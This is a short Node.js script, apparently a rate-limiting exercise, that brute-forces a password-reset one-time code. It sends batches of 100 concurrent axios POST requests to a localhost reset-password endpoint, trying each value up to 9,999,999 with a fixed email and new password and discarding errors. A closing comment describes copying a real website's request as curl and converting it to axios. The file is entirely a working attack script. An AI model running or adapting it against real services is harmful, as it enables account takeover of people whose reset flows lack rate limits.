const axios = require('axios')


  const attack= async(otp)=>{
    
    let data = JSON.stringify({
        "email": "manu5@example.com",
        "otp":otp,
        "newPassword":"125468"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
      try{
        await axios.request(config)
      }catch(e){

      }
        
      
     
      
      
  }
  async function main(){
    
    for(let i=0;i<9999999;i+=100){
        const p =[]
        console.log(i)
        for(let j=0;j<100;j++){
            p.push(attack((i+j).toString()))
        }
      await Promise.all(p)
        
      }
  }
  main()
  
  
  //promis.all- wait for all  100 to succed , then go to next iteration
  //network real website copy as curl->>posy man--> convert to axios